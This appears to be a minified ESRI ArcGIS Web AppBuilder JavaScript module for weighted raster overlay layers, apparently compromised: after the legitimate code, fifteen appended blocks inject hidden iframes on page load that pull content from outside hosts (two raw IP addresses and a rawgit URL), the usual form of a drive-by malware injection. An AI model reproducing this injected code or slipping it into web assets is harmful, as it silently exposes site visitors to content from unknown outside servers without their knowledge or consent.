// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/lang","dojo/_base/array","dojo/Deferred","esri/layers/RasterFunction"],function(n,g,k,h){return{serverSideRasterFunctionName:"WeightedOverlay_7_1_9_colormap",applyItemDataRenderingRule:function(a,b,c){var d;try{this.isServerSideWRORule(c)?(d=new h,d.functionName=c.renderingRule.rasterFunction||c.renderingRule.functionName,d.arguments=c.renderingRule.rasterFunctionArguments||c.renderingRule.arguments,d.variableName=c.renderingRule.variableName,a.setRenderingRule(d,!1)):c&&c.renderingRule&&
b.supportsClientSideWRO&&(d=new h(c.renderingRule),a.setRenderingRule(d,!1))}catch(e){console.error(e)}},hasServerSideWROFunction:function(a){var b=this.serverSideRasterFunctionName;return a&&(this.isServerSideWRORule(a)||a.rasterFunctionInfos&&g.some(a.rasterFunctionInfos,function(a){if(a&&a.name===b)return!0}))?!0:!1},isServerSideWRORule:function(a){var b=this.serverSideRasterFunctionName;return a&&a.renderingRule&&a.renderingRule.rasterFunction&&a.renderingRule.rasterFunction===b||a&&a.renderingRule&&
a.renderingRule.functionName&&a.renderingRule.functionName===b?!0:!1},makeItemData:function(a,b){a=a.designModelView.weightedOverlayService.modelToImageServiceLayer(b,{modelTitle:"New Model"});b={};n.mixin(b,a);delete b.id;delete b.url;delete b.opacity;delete b.title;return b},newWROInfo:function(){return{isGETen3:!1,isWROLayer:!1,isWROModel:!1,hasServerSideWROFunction:!1,supportsClientSideWRO:!1}},validateWROLayer:function(a,b,c,d,e){var f=new k,h="Title Url Description InputRanges OutputValues NoDataRanges RangeLabels NoDataRangeLabels".split(" "),
l=!1;c.isGETen3=10.3<=b.version;c.hasServerSideWROFunction=this.hasServerSideWROFunction(b);if(c.isGETen3){b.allowRasterFunction||d.push(a.wro.validation.notAllowRasterFunction);b.defaultResamplingMethod&&"Nearest"===b.defaultResamplingMethod||d.push(a.wro.validation.notNearestResampling);var m=[];b.fields&&(m=b.fields);g.forEach(h,function(b){g.some(m,function(a){return b===a.name})||d.push(a.wro.validation.missingFieldPattern.replace("{field}",b))});0<d.length&&!e&&(l=!1);l?b.getKeyProperties().then(function(b){"undefined"!==
typeof b&&null!==b&&b.IsWeightedOverlay?c.supportsClientSideWRO=!0:d.push(a.wro.validation.notIsWeightedOverlayProp);f.resolve()},function(a){f.reject(a)}):(0===d.length&&(c.supportsClientSideWRO=!0),f.resolve())}else c.hasServerSideWROFunction||d.push(a.wro.validation.notAWroService),f.resolve();return f},waitForLayer:function(a,b){var c=new k,d=[];if(a.loaded)return c.resolve(a),c;if(a.loadError)return c.reject(a.loadError),c;var e=function(){g.forEach(d,function(a){a.remove()})};d.push(a.on("load",
function(a){e();c.resolve(a.layer)}));d.push(a.on("error",function(a){e();a=a.error;try{a.message&&-1!==a.message.indexOf("Unable to complete")?(console.warn("layerAccessError",a),c.reject(Error(b.wro.validation.inaccessible))):c.reject(a)}catch(p){c.reject(a)}}));return c}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});